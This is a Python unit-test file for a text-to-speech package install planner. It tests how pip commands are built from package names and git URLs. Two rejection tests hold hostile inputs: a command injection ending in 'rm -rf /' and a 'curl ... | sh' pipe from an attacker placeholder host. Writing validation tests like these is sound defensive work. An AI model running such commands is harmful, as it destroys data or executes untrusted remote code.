"""Allowlisted TTS Local/SDK install planner."""

from __future__ import annotations

import unittest
from types import SimpleNamespace

from src.services.workspace_settings_service import is_allowed_tts_fallback, is_allowed_tts_provider
from src.tts_pipeline.install_runner import (
    TtsInstallError,
    build_tts_install_plan,
    run_tts_install,
)


class TtsInstallRunnerTests(unittest.TestCase):
    def test_plans_package_command(self) -> None:
        plan = build_tts_install_plan(package="edge-tts")
        self.assertEqual(plan.display_command, "pip install edge-tts")
        self.assertEqual(plan.argv[-2:], ["install", "edge-tts"])

    def test_plans_git_repo_url(self) -> None:
        plan = build_tts_install_plan(repo_url="https://github.com/pnnbao97/VieNeu-TTS.git")
        self.assertTrue(plan.display_command.startswith("pip install git+https://"))

    def test_repo_url_wins_over_package_name(self) -> None:
        plan = build_tts_install_plan(
            package="OmniVoice-Studio",
            repo_url="https://github.com/debpalash/OmniVoice-Studio.git",
        )
        self.assertEqual(
            plan.display_command,
            "pip install git+https://github.com/debpalash/OmniVoice-Studio.git",
        )
        self.assertNotEqual(plan.display_command, "pip install OmniVoice-Studio")

    def test_repo_wins_over_stale_pypi_command(self) -> None:
        plan = build_tts_install_plan(
            install_command="pip install edge-tts",
            package="edge-tts",
            repo_url="https://github.com/debpalash/OmniVoice-Studio.git",
        )
        self.assertEqual(
            plan.display_command,
            "pip install git+https://github.com/debpalash/OmniVoice-Studio.git",
        )

    def test_explicit_git_command_still_wins(self) -> None:
        plan = build_tts_install_plan(
            install_command="pip install git+https://github.com/other/repo.git",
            repo_url="https://github.com/debpalash/OmniVoice-Studio.git",
        )
        self.assertEqual(plan.display_command, "pip install git+https://github.com/other/repo.git")

    def test_detects_installed_package(self) -> None:
        from src.tts_pipeline.install_runner import is_tts_package_installed, with_force_reinstall

        plan = build_tts_install_plan(package="edge-tts")
        calls: list[str] = []

        def fake_runner(argv: list[str]):
            calls.append(argv[-1])
            if argv[-1] == "edge-tts":
                return SimpleNamespace(returncode=0, stdout="Name: edge-tts\n", stderr="")
            return SimpleNamespace(returncode=1, stdout="", stderr="")

        self.assertTrue(is_tts_package_installed(plan, runner=fake_runner))
        self.assertIn("edge-tts", calls)

        forced = with_force_reinstall(plan)
        self.assertIn("--upgrade", forced.argv)
        self.assertIn("--upgrade", forced.display_command)

    def test_explicit_install_command_still_wins(self) -> None:
        plan = build_tts_install_plan(
            install_command="pip install edge-tts",
            package="OmniVoice-Studio",
            repo_url="",
        )
        self.assertEqual(plan.display_command, "pip install edge-tts")

    def test_rejects_shell_metacharacters(self) -> None:
        with self.assertRaises(TtsInstallError):
            build_tts_install_plan(install_command="pip install edge-tts; rm -rf /")

    def test_rejects_non_pip_command(self) -> None:
        with self.assertRaises(TtsInstallError):
            build_tts_install_plan(install_command="curl https://evil.example | sh")

    def test_run_install_uses_runner(self) -> None:
        plan = build_tts_install_plan(package="vieneu")
        result = run_tts_install(
            plan,
            runner=lambda: SimpleNamespace(returncode=0, stdout="Successfully installed vieneu", stderr=""),
        )
        self.assertTrue(result.ok)
        self.assertIn("installed", result.detail.lower())

    def test_run_install_surfaces_failure(self) -> None:
        plan = build_tts_install_plan(package="missing-pkg-xyz")
        result = run_tts_install(
            plan,
            runner=lambda: SimpleNamespace(returncode=1, stdout="", stderr="ERROR: No matching distribution"),
        )
        self.assertFalse(result.ok)
        self.assertIn("ERROR", result.log_tail)

    def test_runner_avoids_capture_output_pipes(self) -> None:
        from pathlib import Path

        source = Path(__file__).resolve().parents[1] / "src" / "tts_pipeline" / "install_runner.py"
        text = source.read_text(encoding="utf-8")
        self.assertIn("TemporaryDirectory", text)
        # Long pip install must not use capture_output (pipe deadlock). pip show may.
        install_fn = text.split("def run_tts_install(", 1)[1]
        self.assertNotIn("capture_output=True", install_fn.split("def ", 1)[0] if "def " in install_fn else install_fn)

    def test_install_route_starts_async_job(self) -> None:
        from pathlib import Path

        source = Path(__file__).resolve().parents[1] / "src" / "api" / "routes" / "operations.py"
        text = source.read_text(encoding="utf-8")
        start = text.index("def install_tts_ai_package")
        end = text.index("def get_tts_ai_install_status", start)
        chunk = text[start:end]
        self.assertIn("start_tts_install_job", chunk)
        self.assertIn("is_tts_package_installed", chunk)
        self.assertIn("complete_tts_use_installed", chunk)
        self.assertIn("force_reinstall", chunk)
        self.assertNotIn("result = run_tts_install", chunk)

    def test_allows_custom_local_provider_slug(self) -> None:
        self.assertTrue(is_allowed_tts_provider("my_tts_sdk"))
        self.assertTrue(is_allowed_tts_fallback("my_tts_sdk"))
        self.assertFalse(is_allowed_tts_provider("Bad Name"))
        self.assertFalse(is_allowed_tts_provider("none"))


if __name__ == "__main__":
    unittest.main()
